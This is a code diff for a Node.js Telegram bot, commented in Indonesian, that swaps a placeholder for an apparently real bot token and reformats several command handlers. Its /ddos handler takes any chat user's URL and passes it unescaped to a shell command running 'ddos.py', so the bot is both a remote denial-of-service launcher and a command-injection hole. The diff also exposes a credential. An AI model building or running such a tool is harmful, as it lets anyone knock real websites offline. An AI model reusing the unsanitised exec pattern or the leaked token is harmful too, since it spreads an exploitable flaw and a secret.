@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { exec } = require('child_process');
 const fs = require('fs');
 const request = require('request');
-const token = 'YOUR_TELEGRAM_BOT_TOKEN';
+const token = '6674838409:AAHLkaUy93k648M8FlvlhBddJLD0NgfzYd0';
 const bot = new TelegramBot(token, { polling: true });
 
 let isDDOSRunning = false; // Variabel untuk menandai apakah serangan DDOS sedang berlangsung
@@ -245,35 +245,35 @@ bot.onText(/\/cpcek/, (msg) => {
 
 // Handler untuk command /ddos
 bot.onText(/\/ddos (.+)/, (msg, match) => {
-const chatId = msg.chat.id;
-const url = match[1];
-const duration = 90; // Default duration, you can change this as needed
+    const chatId = msg.chat.id;
+    const url = match[1];
+    const duration = 90; // Default duration, you can change this as needed
 
-if (isDDOSRunning) {
-bot.sendMessage(chatId, 'Sorry, another DDOS attack is already in progress. Please wait until it finishes.');
-return;
-}
+    if (isDDOSRunning) {
+        bot.sendMessage(chatId, 'Sorry, another DDOS attack is already in progress. Please wait until it finishes.');
+        return;
+    }
 
-isDDOSRunning = true;
+    isDDOSRunning = true;
 
-bot.sendMessage(chatId, `Starting DDOS attack to ${url} for ${duration} seconds...`);
+    bot.sendMessage(chatId, `Starting DDOS attack to ${url} for ${duration} seconds...`);
 
-exec(`python3 ddos.py ${url} ${duration}`, (error, stdout, stderr) => {
-isDDOSRunning = false; // Reset the flag after attack is finished
-if (error) {
-bot.sendMessage(chatId, `Error: ${error.message}`);
-console.error(`Error: ${error.message}`);
-return;
-}
-if (stderr) {
-bot.sendMessage(chatId, `Stderr: ${stderr}`);
-console.error(`Stderr: ${stderr}`);
-return;
-}
+    exec(`python3 ddos.py ${url} ${duration}`, (error, stdout, stderr) => {
+        isDDOSRunning = false; // Reset the flag after attack is finished
+        if (error) {
+            bot.sendMessage(chatId, `Error: ${error.message}`);
+            console.error(`Error: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            bot.sendMessage(chatId, `Stderr: ${stderr}`);
+            console.error(`Stderr: ${stderr}`);
+            return;
+        }
 
-console.log(`Stdout: ${stdout}`);
-bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
-});
+        console.log(`Stdout: ${stdout}`);
+        bot.sendMessage(chatId, stdout); // Sending stdout to the user for debugging
+    });
 });
 
 // Handler untuk command /shellcek
@@ -338,26 +338,26 @@ bot.onText(/\/shellcek/, (msg) => {
 
 // Handler untuk command /whois
 bot.onText(/\/whois (.+)/, (msg, match) => {
-const chatId = msg.chat.id;
-const ipAddress = match[1];
+    const chatId = msg.chat.id;
+    const ipAddress = match[1];
 
-getWhoisInfo(ipAddress, (result) => {
-bot.sendMessage(chatId, result);
-});
+    getWhoisInfo(ipAddress, (result) => {
+        bot.sendMessage(chatId, result);
+    });
 });
 
 // Handler untuk command /http
 bot.onText(/\/http (.+)/, (msg, match) => {
-const chatId = msg.chat.id;
-const url = match[1];
+    const chatId = msg.chat.id;
+    const url = match[1];
 
-bot.sendMessage(chatId, `Checking HTTP status for ${url}...`, {
-reply_markup: {
-inline_keyboard: [
-[{ text: 'Check', url: `https://check-host.net/check-http?host=${encodeURIComponent(url)}` }]
-]
-}
-});
+    bot.sendMessage(chatId, `Checking HTTP status for ${url}...`, {
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: 'Check', url: `https://check-host.net/check-http?host=${encodeURIComponent(url)}` }]
+            ]
+        }
+    });
 });
 
 bot.on('polling_error', (error) => console.log(`Polling Error: ${error.message}`));
